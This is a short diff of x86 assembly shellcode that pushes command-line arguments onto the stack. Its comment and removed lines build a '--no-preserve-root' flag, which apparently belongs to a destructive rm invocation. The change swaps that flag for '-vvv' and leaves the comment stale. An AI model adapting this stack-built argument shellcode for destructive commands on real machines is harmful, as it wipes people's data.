@@ -28,11 +28,7 @@ _start:
 
     ; push --no-preserve-root to the stack and save it into edx
 
-    push 0x2020746f
-    push 0x6f722d65
-    push 0x76726573
-    push 0x6572702d
-    push 0x6f6e2d2d
+    push 0x7676762d
     mov edx, esp
 
     ; push null eax register to the stack
@@ -55,6 +51,7 @@ _start:
 
     ; push everything on the stack
     push eax
+    push edx
     push ecx
     push esi
     push ebx
